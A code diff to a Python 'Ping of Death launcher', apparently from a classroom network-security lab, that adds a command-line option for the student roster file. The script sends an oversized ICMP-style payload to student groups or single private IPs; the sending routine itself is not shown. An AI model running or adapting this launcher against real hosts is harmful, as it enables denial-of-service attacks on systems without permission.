@@ -5,7 +5,7 @@ import time
 
 PAYLOAD = "X" * 60000   # oversized payload
 
-def load_roster(path="ids_sec3_students.json"):
+def load_roster(path):
     with open(path) as f:
         return json.load(f)
 
@@ -28,11 +28,17 @@ def attack_group(group_name, roster):
 
 def main():
     parser = argparse.ArgumentParser(description="Ping of Death launcher")
+
+    # NEW: roster file argument
+    parser.add_argument("--roster", default="ids_sec3_students.json",
+                        help="Roster JSON file (default: ids_sec3_students.json)")
+
     parser.add_argument("--target-group", help="Group name (e.g., group1)")
     parser.add_argument("--target-ip", help="Single IP (e.g., 192.168.2.26)")
     args = parser.parse_args()
 
-    roster = load_roster()
+    # UPDATED: load roster from argument
+    roster = load_roster(args.roster)
 
     if args.target_ip:
         send_pod(args.target_ip)
